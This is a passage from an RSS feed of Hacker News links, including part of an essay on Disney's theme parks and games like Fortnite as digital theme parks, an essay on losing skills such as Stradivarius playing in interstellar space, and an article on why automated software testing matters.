          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png" data-image-dimensions="2500x1247" data-image-focal-point="0.5,0.5" alt="Jacob Navok  with his father in 1986; Jacob Navok with his son in 2020" data-load="false" data-image-id="5e656b6de2671908cf0b1c50" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png">
          </p>
        
          
        

        
          
          <figcaption>
            <p><a href="https://twitter.com/jnavok?lang=en">Jacob Navok</a> with his father in 1986; Jacob Navok with his son in 2020</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583704876360_24796"><div><p>And because of real estate scarcity, lengthy build times, enormous capital requirements (exacerbated by<a href="http://en.wikipedia.org/wiki/Baumol's_cost_disease"> Baumol’s Cost Disease</a>), Disney’s theme parks, resorts, and cruises are incredibly difficult to replicate by another Western media company. It would take twenty years and tens of billions of dollars for AT&amp;T/WarnerMedia to receive permits, design attractions, and build a fully operational theme park, for example (and it’d probably be in the middle of nowhere). It’s especially hard to imagine all of this occurring while the company is investing tens of billions per year into HBO Max, new 5G network infrastructure, and maintenance capex (while also sustaining tens of billions in dividends and debt service, and fending off agitated investors). Comcast/Universal has an ambitious plan to grow its parks footprint, including new resorts in Russia, South Korea, and Singapore. However, these will take years and tens of billions of dollars. Purely comping the number of parks also overlooks the scale differential. Disney’s Orlando resort, for example, is over 25,000 acres (half used). Universal Studios Orlando is barely 500. In addition, Disney operates four cruise ships (another three are due by 2023), while no competitor does. Overall, Disney’s theme parks business generates more than $26B per year with 175MM+ visitors, compared to 6B for Universal Studios, with 50MM.</p><p>However, the defensibility and value of these businesses goes beyond physical and financial barriers to entry; running a successful theme park means far more than designing a fun ride. Giving real hugs to kids is incredibly dangerous — doing this reliably, safely, and positively millions of times per year requires enormous training (the parks also operate hospitals, pet day care and police services, too!). In addition, these parks must cater to a wide variety of different customers with different needs, physical capabilities, and developmental maturity. In contrast, a film or TV show has only one version that lasts forever and is infinitely repeatable with 100% consistency. There is no other “medium” in the entertainment industry that requires melding more art forms (e.g. live performance, set design, music, engineering) with a smaller margin for error, and at such a great scale. The benefit, though, is a rich, hard to replicate and intimate understanding of the consumer.</p><p>The competitive consequences are profound and only growing. Fans simply cannot enjoy DC or Lord of the Rings or Dragon Ball the way they do Disney’s Princesses, Pixar, most recently, Star Wars, and soon, the Avengers franchises. This fundamentally limits a franchise’s ability to grow love — the lifeblood (and profit driver) of all IP-based companies.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583703445914_105588"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <a href="https://www.matthewball.vc/all/marginalaffinity" data-animation-role="image" data-description="">
            
            <img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704276350-57SC1180IMU577Q1G2VV/ke17ZwdGBToddI8pDm48kHOrWH00r8lczZbSY6Q3rqZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIs8DdG5mDMJJVuX1u-bmhC-P6JCcY2JAH49h2IsMFZkcKMshLAGzx4R3EDFOm1kBS/worship-cat-egypt-750x477.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704276350-57SC1180IMU577Q1G2VV/ke17ZwdGBToddI8pDm48kHOrWH00r8lczZbSY6Q3rqZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIs8DdG5mDMJJVuX1u-bmhC-P6JCcY2JAH49h2IsMFZkcKMshLAGzx4R3EDFOm1kBS/worship-cat-egypt-750x477.jpg" data-image-dimensions="750x365" data-image-focal-point="0.5,0.5" alt="worship-cat-egypt-750x477.jpg" src="https://www.matthewball.vc/all/worship-cat-egypt-750x477.jpg">
            
          
            </a>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703445914_134473"><div><p>This is why brands like 20th Century Fox and WarnerMedia license their theme park IP from super-popular brands like <em>Avatar</em>, <em>The Simpsons</em>, and <em>Harry Potter</em> to their competitors, Disney and Universal. Nintendo also partnered with Universal for its theme park rights. This extension is strategically important and financially valuable, but it’s also quite costly. The rights owner, for example, neither owns the customer relationship nor do they deliver the end-customer experience (in a weird way, Universal has a closer relationship with <em>Harry Potter</em> fans than WarnerMedia does). In addition, the majority of associated profits go to the park operator — who also gets to intermingle their IP and draft off the popularity of their competitors’ franchises, too. That’s risky in an age where franchises and <a href="https://www.matthewball.vc/all/disneylessons">clarity of franchise ownership is key</a>.</p><p>So, as we embrace the digital era, it’s funny to consider the enduring and durable significance of the analogue theme parks business. It is incredibly profitable and will continue to grow as new mobile technology/personalization enhance the park-going experience. The barriers to replication are incredibly high and span both fixed investment (land and infrastructure) and skillset (e.g. design and boots-on-the-ground operations). It also offers an intimate understanding of the consumer, is particularly potent when connected to an IP flywheel, and is able to constantly renew its appeal through new attractions and updates.</p><p><span><strong><em>Chapter Two: The (Start of the) New Theme Parks</em></strong></span></p><p>These parks exist and thrive because of our desire to be “inside a living story”. This was Walt’s primary goal with Disneyland: to go beyond passive consumption and into active immersion. Consider the following quote from one of Disney’s chief Imagineers: </p><blockquote><p><em>“Disneyland is an experience involving many moving parts in harmony, like an orchestra. Everything has to be tuned, what you hear, what you smell, what you see, how you see it, the speed at which you assimilate all of that, just like a film, is choreographed. But how do you choreograph that if you don't control the camera, because the camera is you — it's you when you come to Disneyland".</em></p></blockquote><p>This idea of agency is key. There’s only so much time one can spend in a physical or virtual world as a pre-defined character. That doesn’t mean we want to remain an exact replica of our “IRL” selves — we might want to be taller, or blue, or metal, and so on. But when you’re <em>specifically </em>Iron Man, there are limits to what you can look like, how you can behave, what you can do or be, where you can go, and how long it makes sense to be there. After all, you can’t actually be Iron Man, just pretend to be. And certainly, it doesn’t make sense if all of your friends are all Iron Man, too.</p></div></div><div data-block-json="{&quot;cache_age&quot;:&quot;3153600000&quot;,&quot;authorUrl&quot;:&quot;https://twitter.com/DonaldMustard&quot;,&quot;width&quot;:550,&quot;resolveObject&quot;:&quot;Tweet&quot;,&quot;html&quot;:&quot;<blockquote class=\&quot;twitter-tweet\&quot;><p lang=\&quot;en\&quot; dir=\&quot;ltr\&quot;>In Fortnite you will always be you. Agency is the key.</p>\u2014 Donald Mustard (@DonaldMustard) <a href=\&quot;https://twitter.com/DonaldMustard/status/1205968434690838529?ref_src=twsrc%5Etfw\&quot;>December 14, 2019</a></blockquote>\n<script async=\&quot;\&quot; src=\&quot;https://platform.twitter.com/widgets.js\&quot; charset=\&quot;utf-8\&quot;></script>&quot;,&quot;url&quot;:&quot;https://twitter.com/DonaldMustard/status/1205968434690838529&quot;,&quot;resolvedBy&quot;:&quot;twitter&quot;,&quot;authorName&quot;:&quot;Donald Mustard&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;resolved&quot;:true,&quot;type&quot;:&quot;rich&quot;,&quot;providerName&quot;:&quot;Twitter&quot;,&quot;providerUrl&quot;:&quot;https://twitter.com&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1583703445914_20087"><div><blockquote><p lang="en" dir="ltr">In Fortnite you will always be you. Agency is the key.</p>— Donald Mustard (@DonaldMustard) <a href="https://twitter.com/DonaldMustard/status/1205968434690838529?ref_src=twsrc%5Etfw">December 14, 2019</a></blockquote>
</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703454850_7992"><div><p>For decades, the only real way to experience a digital world with agency and an individual sense of self was to go to the theme park. Games have been on the cusp of these experiences for years, but in 2020, they’re well under way. These are “games” like Minecraft, Fortnite, Roblox, to a lesser extent GTA Online, and Pokémon Go. </p><p>These titles offer many unique advantages compared to their analogue analogues. For example, they are always “open”, “everywhere”, “full of your friends”, and …</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.matthewball.vc/all/digitalthemeparkplatforms">https://www.matthewball.vc/all/digitalthemeparkplatforms</a></em></p>]]>
            </description>
            <link>https://www.matthewball.vc/all/digitalthemeparkplatforms</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183488</guid>
            <pubDate>Mon, 23 Nov 2020 04:10:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building software that doesn't suck]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183389">thread link</a>) | @_hoysala_
<br/>
November 22, 2020 | https://corecursive.com/software-that-doesnt-suck-with-jim-blandy/ | <a href="https://web.archive.org/web/*/https://corecursive.com/software-that-doesnt-suck-with-jim-blandy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4><b>Building Subversion</b></h4><p><span>Software is just the tool and it should get out of your way. In this episode, Jim discusses how to build a great developer tool.&nbsp; It all started with: “What’s the worst software that you use every day?”&nbsp;</span></p><p><a href="https://corecursive.com/054-software-that-doesnt-suck/" target="_blank" rel="noopener noreferrer">Podcast Transcript</a></p><p>“Everybody likes imaginary code because imaginary code is always perfect.” -Jim Blandy</p><p>“You don’t want to maximize engagement with your version control system. You just want it to do its job and get out of the way. And so basically if somebody says, you know, this doesn’t suck. That’s actually pretty much exactly the right thing.” – Jim Blandy</p><p><strong>Links:</strong></p><p><a href="http://subversion.apache.org/" target="_blank" rel="noopener noreferrer">Subversion</a></p><p><a href="https://www.mercurial-scm.org/wiki/" target="_blank" rel="noopener noreferrer">Mercurial&nbsp;</a></p><p><a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener noreferrer">GNU Emacs</a></p></div></div>]]>
            </description>
            <link>https://corecursive.com/software-that-doesnt-suck-with-jim-blandy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183389</guid>
            <pubDate>Mon, 23 Nov 2020 03:47:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Turtle Trick]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183245">thread link</a>) | @patapizza
<br/>
November 22, 2020 | https://jodent.io/posts/the-turtle-trick | <a href="https://web.archive.org/web/*/https://jodent.io/posts/the-turtle-trick">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://jodent.io/posts/the-turtle-trick</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183245</guid>
            <pubDate>Mon, 23 Nov 2020 03:12:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Platforms to create a landing page for your business]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25183182">thread link</a>) | @startupcheckr
<br/>
November 22, 2020 | https://www.startupcheckr.com/lead-capture-landing-pages | <a href="https://web.archive.org/web/*/https://www.startupcheckr.com/lead-capture-landing-pages">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.startupcheckr.com/lead-capture-landing-pages</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183182</guid>
            <pubDate>Mon, 23 Nov 2020 02:56:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Who Plays the Stradivarius in Interstellar Space?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183046">thread link</a>) | @paulorlando
<br/>
November 22, 2020 | https://unintendedconsequenc.es/who-plays-the-stradivarius-in-interstellar-space/ | <a href="https://web.archive.org/web/*/https://unintendedconsequenc.es/who-plays-the-stradivarius-in-interstellar-space/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-947">
		<!-- .entry-header -->

	
	<div>
		<p>This is a piece about the loss of skills — even ones that are marks of great beauty and mastery — due to a change in environment.</p>
<p>It’s an extreme example but a fun one to think through: who would play a Stradivarius violin in interstellar space?</p>
<p>As a way to think through an extreme environmental (not meaning climate here) change, I make the assumption that in coming centuries, whether one, five, or 10, humans will become an interstellar or extrasolar species. That is, some part of humanity will cease living in this solar system, and will instead live on other planets, space ships, or other artificial homes. <strong>I count that assumption as the less interesting part of this post and instead focus on the unintended consequences caused by a dramatic change in environment.</strong></p>
<p>Let’s think through what happens to a specific type of human mastery (and by extension, a framework to apply to many others) as humans make extreme choices (like leaving earth).</p>
<p><em>Q: Who will play the Stradivarius in interstellar space or on extrasolar planets? A: No one. Longer answer below.</em> <span id="more-947"></span></p>
<p>Today, on earth, many people achieve mastery in some skill.</p>
<p>We can include “common” skills such as learning your native language to fluency and skills that are innate, like learning to walk. The rarer skills I consider here require more concerted effort to acquire.</p>
<p>Types of skills in demand are plentiful but change over time. Some skills used to be mainstream but are now niche or largely lost except in small isolated groups, such as navigation by stars, foraging, or making clothing from scratch. Bringing those skills back to an <a href="https://unintendedconsequenc.es/acquiring-ignorance/">ignorant</a> larger population would not make sense today. Some skills are preserved by small niches of people within families or initiates (such as Chinese <a href="https://www.youtube.com/watch?v=KwfGdJIzYZs">“face changing” or bian lian</a>). Some are preserved widely by those who opt in by putting in the work, such as chess, forms of painting and ceramics, and musical performance.</p>
<p><strong>For some of the skills with modern masters, leaving earth will mean that future humans will neither preserve those skills, nor be able to acquire them even if they wanted to.</strong></p>
<p>I chose music because it is an enduring human behavior, unlikely to disappear. I chose Stradivarius violins because they represent mastery in physical instrument construction and rarity.</p>
<p>With only 650 instruments remaining (around 500 violins) and <a href="http://www.stradivarius.org/price/">often sold</a> for prices in the millions, I make the assumption that people who typically play a Stradivarius violin are violin masters whether or not they own the instrument themselves.</p>
<p>Here are examples related to the acquisition and maintenance of skill mastery, as demonstrated on a Stradivarius. In interstellar space.</p>

<p>Acquiring mastery in an uncommon skill takes uncommon effort.</p>
<p>It takes so much effort that acquiring an uncommon skill often also requires family and economic support. A small percentage of those who play the violin will pursue the instrument for over a decade of focused study and practice to have a chance to attain a level of mastery.</p>
<p>Those future interstellar humans’ new environment may not allow for them to put in that uncommon effort. Or, just as dangerous, where today there is a community of masters to practice and play with, in the future interstellar state, there may be so few masters that a string quartet is never possible. Less humans to practice and play with is probably assured.</p>

<p>A <a href="https://infogalactic.com/info/The_Dark_Forest">ravine-like</a> global crash that eliminates all violin players, teachers, and even knowledge of classical music is a possibility. What happens when there is no place to which the players can escape, survive, and continue until the situation improves? The ravine impacts violinists regardless of location.</p>
<p>Without a continual string of teachers and students, mastery becomes mystery and impossible to acquire. With effort put on making humans interstellar, will there be energy left for mastery of the violin?</p>

<p>Life in interstellar environments may not allow people to maintain an extreme practice regimen or to build excellent finger dexterity. There’s just no excess capacity to do so. They could in theory acquire the skills but never have time or physical capability.</p>

<p><a href="https://en.wikipedia.org/wiki/Baumol%27s_cost_disease">Baumol’s Cost Disease</a> explains why certain types of work become more expensive over time. “<a href="https://web.archive.org/web/20110724151936/http://publishing.eur.nl/ir/repub/asset/782/TOWSE%20EBOOK_pages0103-0113.pdf">It takes four musicians as much playing time to perform a Beethoven string quartet today as it did in 1800</a>.” That’s without considering the amount of time to acquire mastery in playing the instruments.</p>
<p>In an interstellar society, while people may have excess free time, learning to play with mastery excludes people from other, more productive activities. Spending years to become a violinist has an opportunity cost that could be more extreme than today. Longer lifespans might shift that somewhat.</p>

<p>It’s possible that skill acquisition advances beyond current imagination make it possible for novices to become masters overnight. If that happens and future humans value violin mastery, then perhaps it is more likely to see violin masters in the future, whether in interstellar environments or earth.</p>

<p>It will certainly be possible to build a robot with equal or better manual dexterity to a human. So in the future, even if there is a ravine, perhaps the robots will be preferred as violinists and will play every Strad. Why risk the instruments in human hands?</p>

<p>Why listen to live performances if, at least for classical music, there are no masters around to play live or they are worse than high-quality immersive recordings (or robots)?</p>
<p>It’s possible that future violinists play mostly for themselves.</p>

<p>Music has a shelf life. It’s long for some genres and pieces and short for others. The status quo of the classical repertoire can only be preserved for so long.</p>

<p>Consider what happened to music in the 20th century. The development of good quality microphones and electronic effects led to many new forms of music including the broad types of rock, disco, and rap. Those musical genres were created in part when musicians learned how to apply new technology. The same thing will happen again, as musicians (human or otherwise) apply music technology in new ways.</p>
<p>It’s possible that classical music will no longer be all that good in comparison to future music. Classical music’s popularity has been falling for the past 100 years since the genre stopped being pop music.</p>

<p>It’s worth considering that the original Stradivarius violins will eventually be <a href="https://www.nytimes.com/2019/01/17/arts/music/stradivarius-sound-bank-recording-cremona.html">too fragile to play</a>. Cremona, Italy (where Stradivari worked) has been recording at high-quality the sound of each potential note of its Stradivarius violins in order to preserve that sound for posterity. Can anyone really expect to play a 1,000 year old violin?</p>

<p>Future humans may prevent Stradivarius violins and many other other examples of earth’s artistic mastery from leaving earth. Then again, future humans may want a certain number of Strads to leave as a hedge against future destruction.</p>

<p>Humans are not objective in their appraisal of violins. A double-blind <a href="https://www.pnas.org/content/114/21/5395">study of violinists</a> (they wore goggles) playing modern and Stradivarius violins challenges the belief that Stradivarius is the best. The Strads are often valued in the millions because of their history, and most would claim, their sound. But the overwhelming majority of the violinists in the experiment preferred the modern violins. This is not to say that humans should just accept a forced preference in violin. An argument for why Strads sound (or seem to sound) better has been made from a <a href="http://www.brandstoryonline.com/stradivarius-violins-better/">brand perspective</a>, of all things. It’s the same argument made for fine (expensive) art: that part of the value, maybe most of the value, comes from things that are not objective. Story and history have a big impact on value.</p>

<ul>
<li>Some skills will become impossible to acquire when humans make a large environmental change. These skills are not transferable across vastly different environments and are lost.</li>
<li>Skill loss happens all the time in human history, though certain events speed it up.</li>
<li>Some events make skill loss impossible to undo.</li>
<li>Future humans will deal with different unintended consequences if they build an interstellar society.</li>
<li>Can we build a set of rules to help us assess unintended consequences from dramatic environmental changes?</li>
</ul>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://unintendedconsequenc.es/who-plays-the-stradivarius-in-interstellar-space/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183046</guid>
            <pubDate>Mon, 23 Nov 2020 02:28:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing software is important because developers are expensive]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183004">thread link</a>) | @karlhughes
<br/>
November 22, 2020 | https://www.karllhughes.com/posts/testing-matters | <a href="https://web.archive.org/web/*/https://www.karllhughes.com/posts/testing-matters">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article>
<div>
<p><img src="https://www.karllhughes.com/assets/img/software-testing.png" alt="The Importance of Software Testing">
</p> 

<p>
2020, Nov 21&nbsp;&nbsp;&nbsp;—&nbsp;
8 minute read
</p>
<section id="mc_embed_signup">

</section>
<p>I’m currently writing a series of articles about test frameworks, and it got me thinking about the importance of software testing. Ever since I started writing automated tests almost a decade ago, I’ve found them to be <strong>one of the most useful tools for building maintainable software</strong>, but I still meet developers who don’t write tests.</p>
<p>Sometimes it’s because their boss (or the business team) won’t give them time, sometimes it’s because they’ve never been told about the benefits of testing, and sometimes they just don’t care.</p>
<p><img src="https://i.imgur.com/kR3EGD6.jpg" alt="Can't stop fixing bugs long enough to write tests"></p>
<p>Fortunately, if the reason you’re not writing tests is one of the first two, there’s hope. You <em>can</em> point to real business value generated by testing, and it doesn’t take a huge software system or a long period of time to do so.</p>
<p>Just remember that <strong>your time as a developer is incredibly valuable</strong>, so when you say that you can save yourself (and future software developers) time, your manager can attach real dollars to the problem. In this post, I’ll introduce you to automated software testing and give you the reasons you can take to your boss to make the case for writing tests.</p>
<h2 id="what-is-automated-testing">What is Automated Testing?</h2>
<p>Before I jump into the benefits, I want to make sure you understand what I mean when I say “automated tests.”</p>
<p>Software can be tested manually (traditionally, this means passing your work to a quality assurance team), and it can be tested automatically. In the latter case, developers write code that ensures their code is working. These automated tests are often run using a command-line interface, and almost every programming language <a href="https://en.wikipedia.org/wiki/List_of_unit_testing_frameworks">has a testing framework available</a>.</p>
<p>Unit tests are probably the most widely talked about form of automated test, but there are others. I’ll briefly cover them here, but it will require a dedicated article to do this topic justice.</p>
<ul>
<li><strong>Unit tests</strong> focus on the smallest possible unit of code - typically a function or class. They are fast to run, and you will usually have a lot of them.</li>
<li><strong>Integration tests</strong> ensure that interlocking pieces of your application work together as designed. Sometimes this means testing the layers between classes, and sometimes this means testing the layer between your database and application.</li>
<li><strong>Acceptance tests</strong> are a slightly broader form of integration test. In practice, I use this term to refer to service-level tests.</li>
<li><strong>End-to-end tests</strong> ensure that the entire system works as designed. This means that the frontend and backends are working and talking to one another to accomplish a series of user stories. These are the most time-consuming tests to run, and typically you won’t write as many of them.</li>
<li><strong>“Smoke” tests</strong> are final checks that ensure your recently deployed code is working as intended. They could be as simple as a ping to your API after a deployment to make sure it responds with a <code>200 OK</code>.</li>
<li><strong>Performance tests</strong> ensure your application meets its SLAs by testing how long it takes to handle requests under load. These may be run on every production deployment or - because they’re so complicated and expensive - just when major new features are released.</li>
</ul>
<p>If you’re interested in specific examples of testing patterns, I’ve written about <a href="https://www.karllhughes.com/posts/api-strat-2017-presentation">API testing</a> and <a href="https://www.karllhughes.com/posts/testing-layers">microservice testing</a> in the past. Those posts should be an excellent place to turn next if you want examples you can apply to your application.</p>
<h2 id="why-software-testing-is-important">Why Software Testing is Important</h2>
<p>The business problem with testing is that it’s not immediately apparent that you need them.</p>
<blockquote>
<p>You write a piece of code, and you know it works. You just wrote it. You just ran it…Six months pass. It is time to refactor your code. You would kill for some tests. - <a href="https://swizec.com/blog/you-dont-need-tests">Swizec Teller, You don’t need tests</a></p>
</blockquote>
<p>The diagram below illustrates this point. Initially, the cost of writing no tests or manually testing your code is much lower than writing automated tests. This is because setting up an automated test suite, and getting developers familiar with a test-driven workflow will take some time.</p>
<p><img src="https://www.karllhughes.com/assets/img/cost-of-tests-over-time.png" alt="The cost of automated software tests over time"></p>
<p>Eventually though, maintaining code without tests will lead to costly production bugs, and a manual testing strategy scales linearly (as you add more code, testers must spend more time doing tests). So in the long-run, automated tests make maintaining your code cheaper.</p>
<p>But why is this the case?</p>
<h2 id="the-benefits-of-testing">The Benefits of Testing</h2>
<p>Let’s look at testing from the standpoint of a developer. Once you spend six months on a team that’s consistently writing automated tests, you’ll see the benefits. Here are the things that stand out to me:</p>
<h3 id="1-testing-minimizes-bugs">1. Testing Minimizes Bugs</h3>
<p>Bugs are expensive, and production bugs are the worst offenders. According to <a href="https://www.researchgate.net/publication/255965523_Integrating_Software_Assurance_into_the_Software_Development_Life_Cycle_SDLC">the IBM System Sciences Institute</a>, fixing a production bug costs 100x more than fixing one at design and over 15x more than fixing a bug at implementation. Automated tests can help developers catch edge-case bugs before they make it into production and force other developers to drop everything and fight fires.</p>
<h3 id="2-automated-tests-prevent-regressions">2. Automated Tests Prevent Regressions</h3>
<p>In addition to catching new bugs, a strong automated test suite can help prevent regression. As <a href="https://medium.com/javascript-scene/what-every-unit-test-needs-f6cd34d9836d">Eric Elliot</a> says, “Manual QA is error-prone…It’s impossible for a developer to remember all features that need testing after making a change to refactor, add new features, or remove features.”</p>
<p>Testing becomes even more important when multiple developers are working on the project over many years. Newcomers can’t safely work on code that doesn’t have tests. While you can rely solely on manual tests, this cost grows linearly as the number of features increases, while automated tests can be written once and run very frequently for little to no cost.</p>
<h3 id="3-writing-testable-code-improves-overall-quality">3. Writing Testable Code Improves Overall Quality</h3>
<p>Code quality is another long-term investment that <a href="https://writing.pupius.co.uk/velocity-vs-quality-3d0417fba991">pays off for large software systems</a>. Unit testing can dramatically improve quality when working with developers who are still learning about encapsulation, dependency injection, and scoping, and it is even more advantageous in <a href="https://en.wikipedia.org/wiki/Strong_and_weak_typing">weakly typed languages</a>.</p>
<p><strong>When every new class must have unit tests, it forces developers to stop and think about their architectural choices.</strong></p>
<h3 id="4-tests-enhance-documentation">4. Tests Enhance Documentation</h3>
<p>Good code should be easy to read and at least partially <a href="http://wiki.c2.com/?SelfDocumentingCode">self-documenting</a>, but there’s almost always room for use-case based documentation. That’s where testing comes in. Good test suites give other developers (or maybe just future you) a better idea of what the code was intended to do.</p>
<h3 id="5-tests-help-guide-code-reviewers">5. Tests Help Guide Code Reviewers</h3>
<p>As an important part of the development process, reviewing code can be tedious. Having tests gives the reviewer a place to look for potential errors or missed edge cases. During code reviews, I often start with the tests, ensuring that they are well-written and don’t miss any important cases <em>before</em> I look at the actual code.</p>
<h3 id="6-tests-make-it-easier-to-add-new-features">6. Tests Make It Easier to Add New Features</h3>
<p>Code gets naturally harder to change the more interconnected and older it is. Tests counter this tendency towards calcification by helping developers add new features more confidently. As a new developer, changing older parts of your codebase can be really scary, but with tests, at least you’ll know if you broke something important.</p>
<h3 id="7-tests-can-help-you-debug-edge-cases">7. Tests Can Help You Debug Edge Cases</h3>
<p>Finally, I use tests to help debug edge cases that show up in production. For example, if we start to see a problem in the logs that wasn’t showing up in testing, I’ll try to write a test case that causes the same error. Once reproduced in a test, I use this as a blueprint to fix the issue and ensure it doesn’t show up again.</p>
<h2 id="how-to-get-started-testing">How to Get Started Testing</h2>
<p>If you’re brand new to testing, this all probably sounds a little intimidating. How do you set up a test suite? Should you do purely test driven development? What if your team isn’t supportive? What about adding tests to a legacy application?</p>
<p>These questions can be overwhelming, even for an experienced software developer.</p>
<p>A few years ago, I started contributing to an open-source project that had almost zero test coverage. Worse, there were a few tests that the original maintainer had written, but he hadn’t bothered to fix as the library evolved. The tests were now failing, but the application was working.</p>
<p>I started to consider my options:</p>
<ul>
<li>Should I try to put a stop to new feature development until we got the tests fixed?</li>
<li>Should I stop using the library until it meets the quality standards I wanted?</li>
<li>Do I try to rewrite the whole thing?</li>
</ul>
<p>Extreme solutions like this can be tempting, but they rarely make good business sense. Implementing tests on an untested app is a process. Much like the <a href="https://www.karllhughes.com/posts/technical-maturity">technical maturity level of a startup</a>, you can’t expect every application to be perfect, but you can make gradual improvements to the test coverage and testability of an application as you work on it.</p>
<p>Here’s how I approached the problem:</p>
<h3 id="1-start-with-end-to-end-tests">1. Start With End-to-End Tests</h3>
<p>Unit tests usually require refactoring, so while they’re great when you’re building an application from scratch, it’s easier to start by writing higher-level acceptance or end-to-end tests for a working application. An automated test that makes sure all the critical features work the whole way through is a great place to start.</p>
<h3 id="2-test-return-types">2. Test Return Types</h3>
<p>The next thing to test is the most mission-critical methods in the most important classes. Even if the code is a spaghetti string mess, you can start by testing the return type from the method. If mocking dependencies isn’t possible, then it’s okay to write some impure tests to get started. Refactoring isn’t safe until you’ve got at least some tests in place.</p>
<h3 id="3-add-tests-one-piece-at-a-time">3. Add Tests One Piece at a Time</h3>
<p>Unit testing a large application takes time and patience. Install a code coverage tool, and start with one small piece at a time. If it’s a big project and it’s going to take a few weeks, so try doing a few classes per week rather than taking the whole thing on at once. This is a good thing for developers who are new to a project to do as it helps them get familiar with the application without being required to change core functionality.</p>
<h3 id="4-start-refactoring">4. Start Refactoring</h3></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.karllhughes.com/posts/testing-matters">https://www.karllhughes.com/posts/testing-matters</a></em></p>]]>
            </description>
            <link>https://www.karllhughes.com/posts/testing-matters</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183004</guid>
            <pubDate>Mon, 23 Nov 2020 02:21:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notion + Super Blogging]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182992">thread link</a>) | @qrush
<br/>
November 22, 2020 | https://quaran.to/notion-super-blogging | <a href="https://web.archive.org/web/*/https://quaran.to/notion-super-blogging">archive.org</a>
